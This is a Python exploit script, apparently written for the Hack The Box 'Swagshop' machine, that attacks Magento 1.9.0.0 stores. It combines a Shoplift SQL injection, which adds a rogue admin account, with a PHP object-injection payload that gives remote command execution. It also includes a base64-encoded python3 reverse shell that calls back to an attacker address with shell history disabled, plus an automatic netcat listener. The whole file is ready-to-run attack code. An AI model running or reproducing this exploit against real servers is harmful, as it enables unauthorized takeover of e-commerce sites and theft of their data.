"""
Title: magento-oneshot
Date: 20190913
Author: epi <epibar052@gmail.com>
  https://epi052.gitlab.io/notes-to-self/
Tested on:
    Magento 1.9.0.0
    Linux 4.4.0-146-generic #172-Ubuntu SMP 2019 x86_64 GNU/Linux
    Python 3.7.4
    requests 2.20.0
    lxml 4.3.3
Example run on HTB's Swagshop:
    python3 magento-oneshot.py http://10.10.10.140/index.php --history-length 1y --command id
    python3 magento-oneshot.py http://10.10.10.140/index.php --history-length 1y --callback 10.10.14.19:12345

Credits:
    This script uses logic from the two exploits below for a more seamless Magento exploitation experience.

    Magento Shoplift exploit (SUPEE-5344)
        https://www.exploit-db.com/exploits/37977
        Author        : Manish Kishan Tanwar AKA error1046
        Date          : 25/08/2015
        Debugged At  : Indishell Lab(originally developed by joren)

    Magento CE < 1.9.0.1 Post Auth RCE
        https://www.exploit-db.com/exploits/37811
        Date: 08/18/2015
        Exploit Author: @Ebrietas0 || http://ebrietas0.blogspot.com
"""
import re
import base64
import argparse
import subprocess
from hashlib import md5
from urllib.parse import urlparse, urljoin

import requests
from lxml import html, etree

HISTORY_LENGTHS = ["24h", "7d", "1m", "1y", "2y"]


def format_query(user: str, pswd: str) -> str:
    """ Formats and returns MySQL statements to add an admin user to the Magento database.

    :param user: new user's username
    :param pswd: new user's password
    :return: string of MySQL statements that add an admin user to the database
    """
    return f"""
    SET @SALT = 'rp';
    SET @PASS = CONCAT(MD5(CONCAT( @SALT , '{pswd}') ), CONCAT(':', @SALT ));
    SELECT @EXTRA := MAX(extra) FROM admin_user WHERE extra IS NOT NULL;
    INSERT INTO `admin_user` (`firstname`, `lastname`,`email`,`username`,`password`,`created`,`lognum`,`reload_acl_flag`,`is_active`,`extra`,`rp_token`,`rp_token_created_at`) VALUES ('Firstname','Lastname','email@example.com','{user}',@PASS,NOW(),0,0,1,@EXTRA,NULL, NOW());
    INSERT INTO `admin_role` (parent_id,tree_level,sort_order,role_type,user_id,role_name) VALUES (1,2,0,'U',(SELECT user_id FROM admin_user WHERE username = '{user}'),'Firstname');
    """.replace(
        "\n", ""
    )


def adduser(tgt: str, username: str, password: str) -> requests.Response:
    """ Add an admin user to the Magento database.

    :param tgt: base url of the target site
    :param username: new user's username
    :param password: new user's password
    :return: requests.Response
    """
    query = format_query(username, password)
    pfilter = f"popularity[from]=0&popularity[to]=3&popularity[field_expr]=0);{query}"
    tgt_url = f"{tgt}/admin/Cms_Wysiwyg/directive/index/"

    # e3tibG9jayB0eXBlPUFkbWluaHRtbC9yZXBvcnRfc2VhcmNoX2dyaWQgb3V0cHV0PWdldENzdkZpbGV9fQ decoded is:
    # {{block type=Adminhtml/report_search_grid output=getCsvFile}}
    return requests.post(
        tgt_url,
        data={
            "___directive": "e3tibG9jayB0eXBlPUFkbWluaHRtbC9yZXBvcnRfc2VhcmNoX2dyaWQgb3V0cHV0PWdldENzdkZpbGV9fQ",
            "filter": base64.b64encode(pfilter.encode()),
            "forwarded": 1,
        },
    )


def validate_http(target_value: str) -> str:
    """ Validates values supplied to the positional parameter target by confirming the presence of a url scheme.

    :param target_value: value supplied to the positional parameter target
    :return: validated target url
    """
    if not target_value.startswith("http"):
        raise argparse.ArgumentTypeError(
            f"value supplied as target must start with either http:// or https://; found {target_value}"
        )
    return target_value


def validate_callback(callback_value: str) -> str:
    """ Validates values supplied to the optional parameter callback by confirming IP:PORT format.

    :param callback_value: value supplied to the optional parameter callback
    :return: validated callback ip:port combo
    """
    values = callback_value.split(":")
    if len(values) == 2 and values[1].isdigit():
        return callback_value
    raise argparse.ArgumentTypeError(
        f"value supplied as callback must start be in the form IP:PORT; found {callback_value}"
    )


def get_initial_session_and_formkey(adm_url: str) -> (requests.Session, str):
    """ Establish initial requests.Session with the target located at the provided URL.

    :param adm_url: target's admin url
    :return: tuple(requests.Session, str)
    """
    sess = requests.Session()
    resp = sess.get(adm_url)
    tree = html.fromstring(resp.content)

    formkeys = tree.xpath("//input[@name='form_key']")  # form_key needed for login POST request
    if formkeys:
        return sess, formkeys[0].value


def login(tgt: str, user: str, pswd: str) -> (requests.Session, requests.Response, str):
    """ Attempt to login to the Magento admin interface.

    :param tgt:  target Magento url
    :param user: username with which to login
    :param pswd: password with which to login
    :return: tuple(requests.Session, requests.Response, str)
    """
    admin_url = f"{tgt}/admin"
    try:
        s, fk = get_initial_session_and_formkey(admin_url)
    except TypeError:
        exit(
            "[!] Could not find form_key attribute on hidden input field."
            "\n\tEnsure your target url is correct."
        )

    r = s.post(admin_url, data={"login[username]": user, "login[password]": pswd, "form_key": fk})
    return None if "Log into Magento Admin Page" in r.text else s, r, fk


def search_orders(login_resp: requests.Response, hist_len: str, key: str, sess: requests.Session):
    """ Performs a POST request to get historic data in the form of a chart.

    The response is used as part of a PHP Object Injection attack.

    :param login_resp: response received from initial login
    :param hist_len: length of time to search back orders
    :param key: form_key needed to send POST request
    :param sess: current admin session
    :return: tuple(requests.Session, requests.Response)
    """
    ajax_url = re.search(b"ajaxBlockUrl = '(.*)'", login_resp.content).group(1)

    resp = sess.post(
        f"{ajax_url.decode()}block/tab_orders/period/{hist_len}/?isAjax=true",
        data={"isAjax": "false", "form_key": key},
    )

    return sess, resp


def get_src_value(orders_resp: requests.Response) -> str:
    """ Retrieve the lone <img> tag's src attribute in the provided Response object.

    :param orders_resp: requests.Response received from search_orders
    :return: src attribue of the <img> tag contained within the Response
    """
    tree = html.fromstring(orders_resp.content)
    xpath_qry = tree.xpath("//img")
    return xpath_qry[0].get("src") if len(xpath_qry) > 0 else None


def get_install_date(url: str) -> str:
    """ Retrieve installation date from /app/etc/local.xml.

    :param url: target url
    :return: string representing installation date
    """
    parsed_url = urlparse(url)
    base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
    r = requests.get(urljoin(base_url, "/app/etc/local.xml"))
    if not r.ok:
        exit(f"[!] Could not retrieve local.xml")

    dates = etree.fromstring(r.content).xpath("//config/global/install/date")
    if not dates:
        exit("[!] Could not find install date.")

    return dates[0].text


def format_payload(php_func: str, cmd: str) -> bytes:
    """ Insert command to be run into the PHP Object Injection payload then base64 encode the result.

    :param php_func: php function to use for OS execution
    :param cmd: command to be run
    :return: encoded POI payload
    """
    payload = (
        'O:8:"Zend_Log":1:{s:11:"\00*\00_writers";a:2:{i:0;O:20:"Zend_Log_Writer_Mail":4:{s:16:'
        '"\00*\00_eventsToMail";a:3:{i:0;s:11:"EXTERMINATE";i:1;s:12:"EXTERMINATE!";i:2;s:15:"'
        'EXTERMINATE!!!!";}s:22:"\00*\00_subjectPrependText";N;s:10:"\00*\00_layout";O:23:"'
        f'Zend_Config_Writer_Yaml":3:{{s:15:"\00*\00_yamlEncoder";s:{len(php_func)}:"{php_func}";s:17:"\00*\00'
        '_loadedSection";N;s:10:"\00*\00_config";O:13:"Varien_Object":1:{s:8:"\00*\00_data"'
        f';s:{len(cmd)}:"{cmd}";}}}}s:8:"\00*\00_mail";O:9:"Zend_Mail":0:{{}}}}i:1;i:2;}}}}'
    )
    return base64.b64encode(payload.encode())


def get_exploit_params(php_func, inst_date, cmd):
    """ Create URL parameters used for PHP Object Injection.

    :param php_func: php function to use for OS execution
    :param inst_date: Magento installation date
    :param cmd: command to be run
    :return: url parameters for exploitation as string
    """
    payload = format_payload(php_func, cmd)
    gh_value = md5(payload + inst_date.encode()).hexdigest()
    return f"?ga={payload.decode()}&h={gh_value}"


def start_netcat(port: str) -> None:
    """ Spawn netcat listener in new xterm window.

    :param port: port on which to listen
    """
    subprocess.Popen(
        [
            "xterm",
            "-fn",
            "-misc-fixed-medium-r-normal--18-*-*-*-*-*-iso8859-15",
            "+sb",
            "-geometry",
            "100x25+0+0",
            "-e",
            f"nc -nvlp {port}",
        ]
    )


def get_callback_command(ip: str, port: str) -> str:
    """ Generate base64 encoded reverse shell callback using python3.

    :param ip: ip to callback to
    :param port: port to callback to
    :return: callback command to be triggered on target
    """
    # shellpop --payload linux/reverse/tcp/python --host 192.168.1.1 --port 12345 --base64
    command = '''python3 -c "import os;import pty;import socket;tQFhDNb='CALLBACK_IP';EerCMGzLKc=CALLBACK_PORT;OMAbFbCzptThAfC=socket.socket(socket.AF_INET,socket.SOCK_STREAM);OMAbFbCzptThAfC.connect((tQFhDNb,EerCMGzLKc));os.dup2(OMAbFbCzptThAfC.fileno(),0);os.dup2(OMAbFbCzptThAfC.fileno(),1);os.dup2(OMAbFbCzptThAfC.fileno(),2);os.putenv('HISTFILE','/dev/null');pty.spawn('/bin/bash');OMAbFbCzptThAfC.close();"'''
    command = command.replace("CALLBACK_IP", ip)
    command = command.replace("CALLBACK_PORT", port)
    encoded_cmd = base64.b64encode(command.encode())
    return f"echo {encoded_cmd.decode()}|base64 -d|/bin/bash"


def main(args):
    # attempt to login first; if it works, no need to add user
    session, resp, formkey = login(args.target, args.username, args.password)

    if session is None:
        print(f"[-] Adding {args.username} to {args.target} with a password of {args.password}")

        resp = adduser(args.target, args.username, args.password)
        if resp.ok:
            print(f"[+] Added {args.username} to {args.target} with a password of {args.password}")
        else:
            exit(f"[!] Could not add user to {args.target}")

        print(f"[-] Logging in to {args.target} as {args.username}")

        session, resp, formkey = login(args.target, args.username, args.password)
        if session is None:
            exit(f"[!] Could not login as {args.username} to {args.target}")
    else:
        print(
            f"[+] Valid credentials ({args.username}:{args.password}) found. Proceeding without adding a new user."
        )

    print(f"[-] Searching historical data using {args.history_length} as period parameter")

    session, resp = search_orders(resp, args.history_length, formkey, session)

    src_value = get_src_value(resp)
    if not resp.ok or not src_value:
        exit(
            "[!] Did not receive results from orders search."
            f"\n\tTry changing value passed to --history-length. Current value is {args.history_length}"
            f"\n\tPossible values are {', '.join(HISTORY_LENGTHS)}"
        )

    print(f"[-] Parsing local.xml for install date.")

    local_xml_url = f"{args.target}/app/etc/local.xml"
    install_date = get_install_date(local_xml_url)

    print(f"[+] Found install date: {install_date}")

    parsed_src_url = urlparse(src_value)
    exploit_url = f"{parsed_src_url.scheme}://{parsed_src_url.netloc}{parsed_src_url.path}"

    if args.command:
        exploit_params = get_exploit_params(args.php_function, install_date, args.command)

        print(f"[-] Sending '{args.command}' for execution on the distant end.")

        resp = session.get(urljoin(exploit_url, exploit_params))
        if resp.status_code == 500:
            print(f"[+] Exploit succeeded", end="\n\n")
            print(resp.text)
    else:
        local_ip = args.callback.split(":")[0]
        local_port = args.callback.split(":")[1]

        start_netcat(local_port)

        cmd = get_callback_command(local_ip, local_port)

        exploit_params = get_exploit_params(args.php_function, install_date, cmd)

        print(f"[+] Initiating callback to {args.callback}.")

        try:
            session.get(urljoin(exploit_url, exploit_params), timeout=10)
        except (KeyboardInterrupt, requests.exceptions.ReadTimeout):
            pass


if __name__ == "__main__":
    parser = argparse.ArgumentParser()

    parser.add_argument("target", help="target url of magento server", type=validate_http)

    cmd_or_cb_group = parser.add_mutually_exclusive_group(required=True)
    cmd_or_cb_group.add_argument("--command", help="Command to be run on the remote system")
    cmd_or_cb_group.add_argument(
        "--callback",
        help="IP address and port to callback to (format: IP:PORT)",
        type=validate_callback,
    )

    parser.add_argument(
        "--username", help="username of new admin user (default: forme)", default="forme"
    )
    parser.add_argument(
        "--password", help="password of new admin user (default: forme)", default="forme"
    )
    parser.add_argument(
        "--php-function",
        help="php function to use for command execution (default: system)",
        default="system",
    )
    parser.add_argument(
        "--history-length",
        help="number of days back to search for orders (default: 7d)",
        default="7d",
        choices=HISTORY_LENGTHS,
    )

    arguments = parser.parse_args()

    main(arguments)
